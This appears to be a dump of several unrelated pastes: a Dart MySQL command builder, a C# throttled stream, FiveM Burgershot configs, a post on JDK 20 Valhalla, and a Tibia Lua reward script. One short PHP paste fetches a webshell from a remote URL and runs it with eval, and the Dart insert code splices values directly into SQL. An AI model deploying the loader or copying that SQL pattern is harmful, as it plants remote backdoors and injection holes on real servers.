        _command.write('`$column` = $parameterPlaceholder ');
      }
      addParameter(parameterPlaceholder, value);
    }
    return this;
  }

  MySqlCommand insert(String table) {
    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`'));
    return this;
  }

  MySqlCommand insertField(String field, Object value) {
    insertFields[lastpair] = '`$field`';
    insertValues[lastpair] = value is String ? ""'$value'"" : value.toString();
    addParameter('@$field', value);
    lastpair++;
    return this;
  }

  MySqlCommand addParameter(String name, Object value) {
    _parameters.add(MySqlParameter(name, value));
    return this;
  }

  MySqlCommand where(String column, Object value, {bool greater = false, bool like = false}) {
    String parameterPlaceholder = '@$column';
    if (like) {
      _command.write(' WHERE `$column` LIKE $parameterPlaceholder');
      addParameter(parameterPlaceholder, '%$value%');
    } else {
      _command.write(' WHERE `$column` ${greater ? '>' : '='} $parameterPlaceholder');
      addParameter(parameterPlaceholder, value);
    }
    return this;
  }

  Future<int> execute(MySqlConnection conn) async {
    if (type == MySqlCommandType.insert) {
      var fields = insertFields.values.join(',');
      var values = insertValues.values.join(',');
      _command = StringBuffer(_command.toString().replaceAll('<F>', fields).replaceAll('<V>', values));
    }
    var result = await conn.query(_command.toString(), _parameters.map((param) => param.value).toList());
    return result.affectedRows;
  }

  Future<Results> query(MySqlConnection conn) async {
    var result = await conn.query(_command.toString(), _parameters.map((param) => param.value).toList());
    return result;
  }
}

class MySqlParameter {
  String name;
  Object value;
  MySqlParameter(this.name, this.value);
}

Future<MySqlConnection> getConnection() async {
  final settings = ConnectionSettings(
    host: 'localhost',
    port: 3306,
    user: 'yourUsername',
    password: 'yourPassword',
    db: 'yourDatabase',
  );
  return await MySqlConnection.connect(settings);
}
"
sTxUA5nH,Throttle Stream,ivandrofly,C#,Monday 24th of June 2024 11:46:41 AM CDT,"using System;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace Born2Code.Net
{
    /// <summary>
    /// Class for streaming data with throttling support.
    /// </summary>
    public class ThrottledStream : Stream
    {
        /// <summary>
        /// A constant used to specify an infinite number of bytes that can be transferred per second.
        /// </summary>
        public const long Infinite = 0;

        #region Private members
        /// <summary>
        /// The base stream.
        /// </summary>
        private Stream _baseStream;

        /// <summary>
        /// The maximum bytes per second that can be transferred through the base stream.
        /// </summary>
        private long _maximumBytesPerSecond;

        /// <summary>
        /// The number of bytes that has been transferred since the last throttle.
        /// </summary>
        private long _byteCount;

        /// <summary>
        /// The start time in milliseconds of the last throttle.
        /// </summary>
        private long _start;
        #endregion

        #region Properties
        /// <summary>
        /// Gets the current milliseconds.
        /// </summary>
        /// <value>The current milliseconds.</value>
        protected long CurrentMilliseconds
        {
            get
            {
                return Environment.TickCount;
            }
        }

        /// <summary>
        /// Gets or sets the maximum bytes per second that can be transferred through the base stream.
        /// </summary>
        /// <value>The maximum bytes per second.</value>
        public long MaximumBytesPerSecond
        {
            get
            {
                return _maximumBytesPerSecond;
            }
            set
            {
                if (MaximumBytesPerSecond != value)
                {
                    _maximumBytesPerSecond = value;
                    Reset();
                }
            }
        }

        /// <summary>
        /// Gets a value indicating whether the current stream supports reading.
        /// </summary>
        /// <returns>true if the stream supports reading; otherwise, false.</returns>
        public override bool CanRead
        {
            get
            {
                return _baseStream.CanRead;
            }
        }

        /// <summary>
        /// Gets a value indicating whether the current stream supports seeking.
        /// </summary>
        /// <value></value>
        /// <returns>true if the stream supports seeking; otherwise, false.</returns>
        public override bool CanSeek
        {
            get
            {
                return _baseStream.CanSeek;
            }
        }

        /// <summary>
        /// Gets a value indicating whether the current stream supports writing.
        /// </summary>
        /// <value></value>
        /// <returns>true if the stream supports writing; otherwise, false.</returns>
        public override bool CanWrite
        {
            get
            {
                return _baseStream.CanWrite;
            }
        }

        /// <summary>
        /// Gets the length in bytes of the stream.
        /// </summary>
        /// <value></value>
        /// <returns>A long value representing the length of the stream in bytes.</returns>
        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support seeking. </exception>
        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
        public override long Length
        {
            get
            {
                return _baseStream.Length;
            }
        }

        /// <summary>
        /// Gets or sets the position within the current stream.
        /// </summary>
        /// <value></value>
        /// <returns>The current position within the stream.</returns>
        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support seeking. </exception>
        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
        public override long Position
        {
            get
            {
                return _baseStream.Position;
            }
            set
            {
                _baseStream.Position = value;
            }
        }
        #endregion

        #region Ctor
        /// <summary>
        /// Initializes a new instance of the <see cref=""T:ThrottledStream""/> class with an
        /// infinite amount of bytes that can be processed.
        /// </summary>
        /// <param name=""baseStream"">The base stream.</param>
        public ThrottledStream(Stream baseStream)
            : this(baseStream, ThrottledStream.Infinite)
        {
            // Nothing todo.
        }

        /// <summary>
        /// Initializes a new instance of the <see cref=""T:ThrottledStream""/> class.
        /// </summary>
        /// <param name=""baseStream"">The base stream.</param>
        /// <param name=""maximumBytesPerSecond"">The maximum bytes per second that can be transferred through the base stream.</param>
        /// <exception cref=""ArgumentNullException"">Thrown when <see cref=""baseStream""/> is a null reference.</exception>
        /// <exception cref=""ArgumentOutOfRangeException"">Thrown when <see cref=""maximumBytesPerSecond""/> is a negative value.</exception>
        public ThrottledStream(Stream baseStream, long maximumBytesPerSecond)
        {
            if (baseStream == null)
            {
                throw new ArgumentNullException(""baseStream"");
            }

            if (maximumBytesPerSecond < 0)
            {
                throw new ArgumentOutOfRangeException(""maximumBytesPerSecond"",
                    maximumBytesPerSecond, ""The maximum number of bytes per second can't be negatie."");
            }

            _baseStream = baseStream;
            _maximumBytesPerSecond = maximumBytesPerSecond;
            _start = CurrentMilliseconds;
            _byteCount = 0;
        }
        #endregion

        #region Public methods
        /// <summary>
        /// Clears all buffers for this stream and causes any buffered data to be written to the underlying device.
        /// </summary>
        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs.</exception>
        public override void Flush()
        {
            _baseStream.Flush();
        }

        /// <summary>
        /// Reads a sequence of bytes from the current stream and advances the position within the stream by the number of bytes read.
        /// </summary>
        /// <param name=""buffer"">An array of bytes. When this method returns, the buffer contains the specified byte array with the values between offset and (offset + count - 1) replaced by the bytes read from the current source.</param>
        /// <param name=""offset"">The zero-based byte offset in buffer at which to begin storing the data read from the current stream.</param>
        /// <param name=""count"">The maximum number of bytes to be read from the current stream.</param>
        /// <returns>
        /// The total number of bytes read into the buffer. This can be less than the number of bytes requested if that many bytes are not currently available, or zero (0) if the end of the stream has been reached.
        /// </returns>
        /// <exception cref=""T:System.ArgumentException"">The sum of offset and count is larger than the buffer length. </exception>
        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support reading. </exception>
        /// <exception cref=""T:System.ArgumentNullException"">buffer is null. </exception>
        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
        /// <exception cref=""T:System.ArgumentOutOfRangeException"">offset or count is negative. </exception>
        public override int Read(byte[] buffer, int offset, int count)
        {
            Throttle(count);

            return _baseStream.Read(buffer, offset, count);
        }

        /// <summary>
        /// Sets the position within the current stream.
        /// </summary>
        /// <param name=""offset"">A byte offset relative to the origin parameter.</param>
        /// <param name=""origin"">A value of type <see cref=""T:System.IO.SeekOrigin""></see> indicating the reference point used to obtain the new position.</param>
        /// <returns>
        /// The new position within the current stream.
        /// </returns>
        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support seeking, such as if the stream is constructed from a pipe or console output. </exception>
        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
        public override long Seek(long offset, SeekOrigin origin)
        {
            return _baseStream.Seek(offset, origin);
        }

        /// <summary>
        /// Sets the length of the current stream.
        /// </summary>
        /// <param name=""value"">The desired length of the current stream in bytes.</param>
        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support both writing and seeking, such as if the stream is constructed from a pipe or console output. </exception>
        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
        public override void SetLength(long value)
        {
            _baseStream.SetLength(value);
        }

        /// <summary>
        /// Writes a sequence of bytes to the current stream and advances the current position within this stream by the number of bytes written.
        /// </summary>
        /// <param name=""buffer"">An array of bytes. This method copies count bytes from buffer to the current stream.</param>
        /// <param name=""offset"">The zero-based byte offset in buffer at which to begin copying bytes to the current stream.</param>
        /// <param name=""count"">The number of bytes to be written to the current stream.</param>
        /// <exception cref=""T:System.IO.IOException"">An I/O error occurs. </exception>
        /// <exception cref=""T:System.NotSupportedException"">The base stream does not support writing. </exception>
        /// <exception cref=""T:System.ObjectDisposedException"">Methods were called after the stream was closed. </exception>
        /// <exception cref=""T:System.ArgumentNullException"">buffer is null. </exception>
        /// <exception cref=""T:System.ArgumentException"">The sum of offset and count is greater than the buffer length. </exception>
        /// <exception cref=""T:System.ArgumentOutOfRangeException"">offset or count is negative. </exception>
        public override void Write(byte[] buffer, int offset, int count)
        {
            Throttle(count);

            _baseStream.Write(buffer, offset, count);
        }

        /// <summary>
        /// Returns a <see cref=""T:System.String""></see> that represents the current <see cref=""T:System.Object""></see>.
        /// </summary>
        /// <returns>
        /// A <see cref=""T:System.String""></see> that represents the current <see cref=""T:System.Object""></see>.
        /// </returns>
        public override string ToString()
        {
            return _baseStream.ToString();
        }
        #endregion

        #region Protected methods
        /// <summary>
        /// Throttles for the specified buffer size in bytes.
        /// </summary>
        /// <param name=""bufferSizeInBytes"">The buffer size in bytes.</param>
        protected void Throttle(int bufferSizeInBytes)
        {
			// Make sure the buffer isn't empty.
            if (_maximumBytesPerSecond <= 0 || bufferSizeInBytes <= 0)
            {
                return;
            }

            _byteCount += bufferSizeInBytes;
            long elapsedMilliseconds = CurrentMilliseconds - _start;

            if (elapsedMilliseconds > 0)
            {
				// Calculate the current bps.
                long bps = _byteCount * 1000L / elapsedMilliseconds;

				// If the bps are more then the maximum bps, try to throttle.
                if (bps > _maximumBytesPerSecond)
                {
                    // Calculate the time to sleep.
                    long wakeElapsed = _byteCount * 1000L / _maximumBytesPerSecond;
                    int toSleep = (int)(wakeElapsed - elapsedMilliseconds);

                    if (toSleep > 1)
                    {
                        try
                        {
							// The time to sleep is more then a millisecond, so sleep.
                            Thread.Sleep(toSleep);
                        }
                        catch (ThreadAbortException)
                        {
                            // Eatup ThreadAbortException.
                        }

                        // A sleep has been done, reset.
                        Reset();
                    }
                }
            }
        }

        /// <summary>
        /// Will reset the bytecount to 0 and reset the start time to the current time.
        /// </summary>
        protected void Reset()
        {
            long difference = CurrentMilliseconds - _start;

            // Only reset counters when a known history is available of more then 1 second.
            if (difference > 1000)
            {
                _byteCount = 0;
                _start = CurrentMilliseconds;
            }
        }
        #endregion
    }
}

Source: Born2Code.Net (Throttling)"
DWzAwA84,TZMC Burgershot Doors,TZMC-FiveM,Lua,Monday 24th of June 2024 11:28:42 AM CDT,"---------------------
-- TZMC Burgershot --
---------------------

-- entrance_parking
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	doors = {
		{
			objHash = 1724308471,
			objYaw = 124.04663848877,
			objCoords = vector3(-1183.373, -885.5644, 13.90346)
		},
		{
			objHash = -571782594,
			objYaw = 304.04663085938,
			objCoords = vector3(-1184.716, -883.5756, 13.90346)
		}
	}
},

-- entrance_parking_employee
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 1009568243,
	objCoords = vector3(-1176.609, -895.5757, 13.90446),
	objHeading = 124.04663848877
},

-- entrance_street
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	doors = {
		{
			objHash = -571782594,
			objYaw = 34.046661376953,
			objCoords = vector3(-1198.777, -885.0333, 13.90346)
		},
		{
			objHash = 1724308471,
			objYaw = 214.04669189453,
			objCoords = vector3(-1196.788, -883.6895, 13.90346)
		}
	}
},

-- entrance_drive_thru
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 1009568243,
	objCoords = vector3(-1199.886, -903.0258, 13.90446),
	objHeading = 304.04666137695
},

-- office
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 846116471,
	objCoords = vector3(-1200.195, -901.2343, 13.90246),
	objHeading = 34.046661376953
},

-- freezer
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 1309514423,
	objCoords = vector3(-1193.738, -900.0775, 13.94934),
	objHeading = 304.04663085938
},

-- drive_thru
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 547885802,
	objCoords = vector3(-1191.715, -902.7607, 13.90246),
	objHeading = 124.04666137695
},

-- drive_thru_window
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = -1905927556,
	objCoords = vector3(-1194.544, -905.5848, 14.3733),
	objHeading = 169.04664611816
},

-- kitchen_to_lockers
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 547885802,
	objCoords = vector3(-1182.503, -899.5582, 13.90246),
	objHeading = 124.04666137695
},

-- employee_toilet
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 846116471,
	objCoords = vector3(-1183.268, -897.0563, 13.90246),
	objHeading = 34.046661376953
},

-- kitchen_to_recep
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 1618088565,
	objCoords = vector3(-1185.813, -895.4786, 13.90246),
	objHeading = 214.04667663574
},

-- recep_to_store
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 1618088565,
	objCoords = vector3(-1185.497, -894.5898, 13.90246),
	objHeading = 124.04666137695
},

-- toilet_handicap
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 846116471,
	objCoords = vector3(-1202.231, -892.0251, 13.90246),
	objHeading = 34.046661376953
},

-- toilet_men_female
{
	authorizedJobs = { ['burgershot']=0 },
	audioRemote = false,
	slides = false,
	garage = false,
	fixText = false,
	lockpick = false,
	maxDistance = 2.0,
	locked = true,
	objHash = 846116471,
	objCoords = vector3(-1201.331, -894.7256, 13.90246),
	objHeading = 124.04666137695
},
"
7pq8Ba4H,"I actually tested JDK 20 Valhalla, here are my findings",DulcetAirman,Java,Monday 24th of June 2024 11:17:09 AM CDT,"Somebody asked this two years ago, but it's archived now: https://www.reddit.com/r/java/comments/yfdofb/anyone_tested_jdk_20_early_access_build_for/
For my tests I created a primitive version of a relatively simple data structure I once created for a sudoku solver (it was a project at uni):
https://github.com/claudemartin/smallset/tree/valhalla
It's a bit field that uses all 32 bits of an int. That means it can hold the values 0 to 31 (inclusive). ""SmallSet"" isn't a great name, but it is a set and it is ""small"" because it is limited to only 32 bits.   
Here are my opinions:
It's relatively easy to use. You really can just use the new keyword ""primitive"" to make any class primitive.
It is stable. I tried the same with Java 14 Valhalla and back then it crashed when I let it run the unit tests in a loop. But now I didn't experience any such problems except for serialisation. 
Since Eclipse doesn't support Valhalla I used ANT and a very simple batch script (I'm on Windows 11). Getting it to run on another system should be just as easy. 
It's weird that you have to use new Foo() to create a primitive value (not a reference). We are used to using the ""new"" keyword to create a new reference, which means memory is allocated on the heap. But now ""new"" just means you call a constructor.
You get an additional type for a boxed version. If you create a primitive class ""Foo"", you also get ""Foo.ref"". Autoboxing works fine. We might even get int.ref as an alias for java.lang.Integer, but that's not the case yet.
Var-args and overloads can be tricky. If you have myMethod(Object... values) and you call it using your own primitive type ""Foo"", you get an Object[] containing only boxed values. You can also get a situation where you don't call the method you want when there are overloads and the compiler uses autoboxing. However, when I created myMethod(SmallSet... values)it didn't compile, because the compiler thinks it's ambiguous. But isn't the second one more specific? Same if you have m(Foo...) and m(Foo.ref[]). And often you have legacy code that has overloads for the existing primitives and everything else goes to a methods that accepts""Object"" or ""Object[]"". That still works in most cases but even if they don't allow overloads with arrays of value types, there will probably be some issues. You can still use getComponentType to check the type. But array.getClass().getComponentType().isPrimitive() will return false. You must use isValue / isIdentity instead.  
Reflection is now a lot more complex and lots of frameworks will not work. So they added isValue and they also added Modifier.VALUE. But we use the keyword ""primitive"", not ""value"". This is extremely confusing. You create a primitive class and it's not primitive?! The modifier ""primitive"" is actually called ""value"" in reflection?! But then there's also ""PrimitiveClass.PRIMITIVE_CLASS"" and now I'm just confused. And isValue is true even if you use it on a Foo.ref type, which is auto-generated and used whenever a reference is required. But how would you know whether a Class<?> is the primitive type or a boxed version of it? There's isPrimitiveValueType, which isn't public. 
And I found more issues with arrays. It's ok that you cant use null inside a SmallSet[]. But somehow I can assign a SmallSet[] to an Object[]. It's not new that you can completely break type safety in Java by assigning some array to some variable with an array type that has a more general component type. But the values inside that Array are actually values. Right now Java can't convert from int[] to Object[], but with Valhalla it can convert from SmallSet[] to Object[]. That makes no sense. But if this is really so it would explain the problem I had with the overloads.  
We still need support for generic types, such as Stream, Optional, Comsumer, etc. It's great that primitives can't be null, but when you want to use Optional you'd have to use the boxed version. There is OptionalInt for integers, but there wouldn't be an Optional for your custom primitive, even if it only uses an int, like my SmallSet. Since we don't even have ByteStream or FloatStream, we might not get a Stream for any custom primitive type. The constant autoboxing will diminish the benefits of suing primitive types. This might come in a different release if they ever actually implement JEP 218. 
Serialisation does not work at all. You can't write it to an ObjectOutputStream because there is no writePrimitive that would accept any custom value type. I created a simple record to hold the primitive value and it doesn't work. You can run the unit tests to reproduce the problem. It might be necessary to implement writeObject() and readObject() so that our custom primitives can be serialised. But I hope this will be fixed. 
It is faster. More than twice as fast on my system and with my simple test. I created thousands of such ""small sets"" to add and remove random numbers and create the complement. On my machine this is about twice as fast. This isn't on the repo but all I had to do is copy the primitive class to a different package and remove the ""primitive"" and some of the methods that wouldn't compile. I used System.nanoTime() and I measured after a few warm up iteration. It was less than 50s vs more than 100s. I didn't measure memory usage as this would require better benchmarking. 
After all that I still hope we soon get something similar to what we already have in this preview. 
Serialisation has to be fixed as some frameworks use it and reflection could be a bit simpler. Arrays shouldn't be used in APIs anyway. The performance is actually much better and so it would be worth it. And I'm sure a lot of other languages that can run on the JVM, such as EcmaScript, Python, and Ruby, will also benefit from this. And IDEs will probably have lots of helpful tips on how to prevent autoboxing. "
vYQhF3Ks,Untitled,Pasterbiner123321,Lua,Monday 24th of June 2024 11:11:37 AM CDT,"-- ten dziala

local uniqueid = 10214
local storage = 10214
local storageTime = 43200 

local items = {
    {id = 2148, chance = 60, name = ""Gold Coin""},        -- very high chance
    {id = 2152, chance = 25, name = ""Platinum Coin""},    -- normal chance
    {id = 2160, chance = 10, name = ""Crystal Coin""},     -- low chance
    {id = 6527, chance = 4, name = ""Server Token""},      -- very low chance
    {id = 8299, chance = 1, name = ""Legendary Gem""}      -- ultra low chance
}

local function getRandomItem()
    local rand = math.random(100)
    local cumulativeChance = 0
    for _, item in ipairs(items) do
        cumulativeChance = cumulativeChance + item.chance
        if rand <= cumulativeChance then
            return item
        end
    end
    return items[1] 
end

local function getFreePosition(usedPositions)
    local arenaMin = Position(32253, 30741, 6)
    local arenaMax = Position(32259, 30744, 6)
    local position

    repeat
        position = Position(math.random(arenaMin.x, arenaMax.x), math.random(arenaMin.y, arenaMax.y), arenaMin.z)
    until not usedPositions[position.x .. "","" .. position.y]

    usedPositions[position.x .. "","" .. position.y] = true
    return position
end

local function dropItem(player, fromPosition, luckyItems, usedPositions)
    local selectedItem = getRandomItem()
    local itemCount = math.random(1, 12)
    local position = getFreePosition(usedPositions)
    local droppedItem = Game.createItem(selectedItem.id, itemCount, position)
    if droppedItem then
        droppedItem:setActionId(5640)
        position:sendMagicEffect(CONST_ME_MAGIC_GREEN)
        fromPosition:sendDistanceEffect(position, CONST_ANI_SMALLICE)
        table.insert(luckyItems, {id = selectedItem.id, name = selectedItem.name, count = itemCount, position = position})

        position:sendMagicEffect(CONST_ME_TUTORIALARROW)

        if (selectedItem.id == 6527 or selectedItem.id == 8299) and itemCount > 5 then
            local itemType = (selectedItem.id == 6527) and ""Server Token"" or ""Legendary Gem""
            local message = string.format(""%s has won %d %s from Compass Treasure!"", player:getName(), itemCount, itemType)
            Game.broadcastMessage(message, TALKTYPE_BROADCAST)
        end
    end

    return luckyItems
end

local function collectItems(playerId, luckyItems)
    local player = Player(playerId)
    if not player then
        for _, item in ipairs(luckyItems) do
            local position = item.position
            local tile = Tile(position)
            local droppedItem = tile and tile:getItemById(item.id)
            if droppedItem then
                droppedItem:remove()
            end
        end
        return
    end

    for _, item in ipairs(luckyItems) do
        local position = item.position
        local tile = Tile(position)
        local droppedItem = tile and tile:getItemById(item.id)
        if droppedItem then
            position:sendDistanceEffect(player:getPosition(), CONST_ANI_SMALLICE)
            droppedItem:remove()
            player:addItem(item.id, item.count)
        end
    end
end

local function dropItems(player, fromPosition, count)
    local luckyItems = {}
    local usedPositions = {}

    local function dropNextItem(i)
        if i <= count then
            luckyItems = dropItem(player, fromPosition, luckyItems, usedPositions)
            addEvent(dropNextItem, 500, i + 1)
        else
            if #luckyItems == 0 then
                luckyItems = dropItem(player, fromPosition, luckyItems, usedPositions)
            end

            local luckMessage = ""You have received:\n""
            for _, item in ipairs(luckyItems) do
                luckMessage = luckMessage .. item.count .. ""x "" .. item.name .. ""\n""
            end

            if #luckyItems > 4 then
                player:say(""Incredible luck!"", TALKTYPE_MONSTER_SAY)
                player:sendTextMessage(MESSAGE_EVENT_ADVANCE, luckMessage)
            elseif #luckyItems > 2 then
                player:say(""Great luck!"", TALKTYPE_MONSTER_SAY)
                player:sendTextMessage(MESSAGE_EVENT_ADVANCE, luckMessage)
            else
                player:say(""Better luck next time!"", TALKTYPE_MONSTER_SAY)
                player:sendTextMessage(MESSAGE_EVENT_ADVANCE, luckMessage)
            end

            
            fromPosition:sendMagicEffect(CONST_ME_EXPLOSIONAREA)

            
            addEvent(collectItems, 6000, player:getId(), luckyItems)
        end
    end

    dropNextItem(1)
end

function onUse(player, item, fromPosition, target, toPosition, isHotkey)
    
    if player:getStorageValue(storage) > os.time() then
        player:sendCancelMessage(""You have already used this item today. Try again later."")
        return true
    end

    
    player:setStorageValue(storage, os.time() + storageTime)

    
    dropItems(player, fromPosition, 5)

    return true
end
"
6tEF1MgD,TZMC Burgershot Job,TZMC-FiveM,Lua,Monday 24th of June 2024 11:06:59 AM CDT," ['burgershot'] = {
        label = 'Burgershot',
        defaultDuty = false,
        offDutyPay = false,
        grades = {
            ['0'] = {
                name = 'Junior Cook',
                payment = 50
            },
            ['1'] = {
                name = 'Cook',
                payment = 100
            },
            ['2'] = {
                name = 'Team Leader',
                payment = 150
            },
            ['3'] = {
                name = 'Manager',
                isboss = true,
                payment = 200
            },
        },
    },
"
KcMZ6q8C,zz,blackhat1337,PHP,Monday 24th of June 2024 11:06:46 AM CDT,"session_start<?php
$a = file_get_contents(https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb@.php');
eval('?>'.$a);"
fYZGWMFS,TZMC Burgershot Useable Items,TZMC-FiveM,Lua,Monday 24th of June 2024 11:05:02 AM CDT,"-- Hornys 
 
QBCore.Functions.CreateUseableItem(""friesburgershot"", function(source, item)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
    end
end)
 
QBCore.Functions.CreateUseableItem(""nuggetsburgershot"", function(source, item)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
    end
end)
 
QBCore.Functions.CreateUseableItem(""bleeder"", function(source, item)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
    end
end)
 
QBCore.Functions.CreateUseableItem(""heartstopper"", function(source, item)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
    end
end)
 
QBCore.Functions.CreateUseableItem(""roosterbooster"", function(source, item)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
        TriggerClientEvent(""consumables:client:Eat"", src, item.name)
    end
end)
 
QBCore.Functions.CreateUseableItem(""sprunk"", function(source, item)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
        TriggerClientEvent(""consumables:client:Drink"", src, item.name)
    end
end)
 
QBCore.Functions.CreateUseableItem(""ecola"", function(source, item)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.Functions.RemoveItem(item.name, 1, item.slot) then
        TriggerClientEvent(""consumables:client:Drink"", src, item.name)
    end
end)
"
